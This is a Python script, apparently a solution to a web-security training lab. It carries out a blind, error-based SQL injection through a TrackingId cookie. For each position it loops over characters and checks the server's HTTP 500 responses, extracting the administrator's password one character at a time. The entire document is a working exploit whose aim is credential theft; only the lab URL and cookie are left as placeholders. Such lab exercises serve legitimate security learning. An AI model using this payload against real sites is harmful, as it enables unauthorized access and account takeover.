import requests
import string

url = "<LAB-URL-HERE"
session_cookie = "SESSION-COOKIE-HERE"

charset = string.ascii_lowercase + string.ascii_uppercase + string.digits

password = ""

for position in range(1, 21):
    found = False
    for char in charset:
        payload = (
            f"TRACKINGID-HERE'||(SELECT CASE WHEN SUBSTR(password,{position},1)='{char}' "
            f"THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
        )
        cookies = {"TrackingId": payload, "session": session_cookie}

        r = requests.get(url, cookies=cookies)

        if r.status_code == 500:
            password += char
            print(f"[+] Position {position}: Found '{char}' → {password}")
            found = True
            break

    if not found:
        print(f"[-] Position {position}: No match at pos {position}. Stopping.")
        break

print(f"\n[+] Extracted password: {password}")
